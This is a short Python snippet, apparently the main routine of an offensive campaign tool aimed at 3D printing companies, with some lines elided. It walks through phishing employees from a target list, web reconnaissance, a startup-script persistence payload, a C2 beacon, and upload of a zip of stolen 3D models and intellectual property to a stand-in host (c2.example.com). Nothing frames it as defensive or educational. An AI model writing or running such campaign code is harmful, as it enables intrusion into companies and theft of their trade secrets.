...
def main():
    """
    Main function to run the 3d_printing_campaign campaign.
    """
    print(f"[*] Starting 3d_printing_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("3D_printing_companies_employees.txt")
    run_tool("apt_web_recon.js", "--target 3D_printing_companies.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/3D_models_and_intellectual_property_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-3D_PRINTING_COMPANIES-01")
    ...
    exfiltration.exfiltrate_data("3D_models_and_intellectual_property/3D_models_and_intellectual_property.zip", "https://c2.example.com/upload")
    run_tool("payloads/3D_models_and_intellectual_property_exfiltrator.py")
